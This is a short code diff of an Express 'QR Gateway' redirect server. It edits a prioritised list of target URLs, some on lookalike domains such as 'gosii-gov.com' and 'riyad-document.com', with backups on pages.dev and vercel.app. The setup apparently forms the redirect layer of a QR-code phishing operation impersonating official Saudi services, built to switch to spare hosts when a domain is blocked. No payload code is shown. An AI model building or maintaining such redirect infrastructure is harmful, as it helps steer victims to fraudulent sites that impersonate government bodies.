@@ -6,7 +6,7 @@ const PORT = process.env.PORT || 3000;
 
 // روابطك (رتبها حسب الأولوية)
 const TARGETS = [
-  "https://riyad-document.com/?code={CODE}",
+  "https://gosii-gov.com/?code=101538454",
   "https://riyad-doc.net/?code={CODE}",
   "https://backup1.pages.dev/?code={CODE}",
   "https://backup2.vercel.app/?code={CODE}"
@@ -44,3 +44,4 @@ app.get("/go", async (req, res) => {
 app.listen(PORT, () => {
   console.log(`QR Gateway running on http://localhost:${PORT}`);
 });
+
